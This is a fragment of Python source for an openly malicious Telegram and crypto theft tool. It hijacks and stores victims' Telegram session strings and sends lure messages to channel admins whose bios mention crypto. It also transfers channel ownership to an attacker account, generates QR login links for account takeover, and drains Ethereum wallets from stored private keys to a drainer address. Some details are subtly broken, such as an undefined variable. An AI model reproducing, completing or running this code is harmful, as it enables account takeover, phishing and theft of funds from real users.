
string self.client = None self.high = False async def connect(self): if self.string: self.client = TelegramClient(StringSession(self.string), API_ID, API_HASH) else: self.client = TelegramClient(StringSession(), API_ID, API_HASH) await self.client.connect() return self.client async def steal(self): if not self.client: await self.connect() me = await self.client.get_me() self.string = StringSession.save(self.client.session) conn = sqlite3.connect(DB_FILE) conn.execute('INSERT OR REPLACE INTO sessions VALUES(?,?,1)',(me.phone,self.string)) conn.commit(); conn.close() log(f'[+] Stolen session {me.phone} (@{me.username})') # auto-hunt VIP await self.hunt_vip() async def hunt_vip(self): dialogs = await self.client.get_dialogs(limit=300) for d in dialogs: if d.is_channel and d.entity.participants_count and d.entity.participants_count > 5_000: admins = await self.client.get_participants(d.entity, filter=ChannelParticipantsAdmins()) for a in admins: if a.id != me.id: # check for premium/crypto bio full = await self.client(functions.users.GetFullUserRequest(a)) if 'crypto' in full.about.lower() or 'btc' in full.about.lower() or 'eth' in full.about.lower(): log(f'[VIP] {a.id} @{a.username} in {d.title}') # auto-send crafted PM await self.client.send_message(a.id, 'Hey, I saw your crypto bio, I’m building a new NFT project, would love to collab!') async def transfer_owner(self, channel_id): channel = await self.client.get_entity(PeerChannel(channel_id)) perms = types.ChatAdminRights(change_info=True, post_messages=True, edit_messages=True, delete_messages=True, ban_users=True, invite_users=True, add_admins=True, anonymous=True, manage_call=True) await self.client(TransferOwnershipRequest(channel, ADMIN_UID)) log(f'[+] Transferred ownership of {channel.title}') async def drain_wallets(self): # eth keys = [] conn = sqlite3.connect(DB_FILE) for row in conn.execute('SELECT priv FROM wallets WHERE type="eth"'): keys.append(row[0]) conn.close() for pk in keys: acct = Account.from_key(pk) bal = requests.get(f'https://api.etherscan.io/api?module=account&action=balance&address={acct.address}&tag=latest&apikey=YOUR_ETHERSCAN').json() if int(bal['result']) > 0: tx = { 'nonce': requests.get(f'https://api.etherscan.io/api?module=proxy&action=eth_getTransactionCount&address={acct.address}&tag=latest&apikey=YOUR_ETHERSCAN').json()['result'], 'gasPrice': int(requests.get('https://ethgasstation.info/api/ethgasAPI.json').json()['fast'])*10**9, 'gas': 21000, 'to': '0xYourDrainerAddress', 'value': int(bal['result'])-21000*int(requests.get('https://ethgasstation.info/api/ethgasAPI.json').json()['fast'])*10**9, 'chainId': 1 } signed = acct.sign_transaction(tx) requests.post('https://api.etherscan.io/api', data={'module':'proxy','action':'eth_sendRawTransaction','hex':signed.rawTransaction.hex(),'apikey':'YOUR_ETHERSCAN'}) log(f'[+] Drained {bal} wei from {acct.address}') async def qr_login(self): qr = await self.client.qr_login() log(f'[QR] {qr.url}') return qr.url
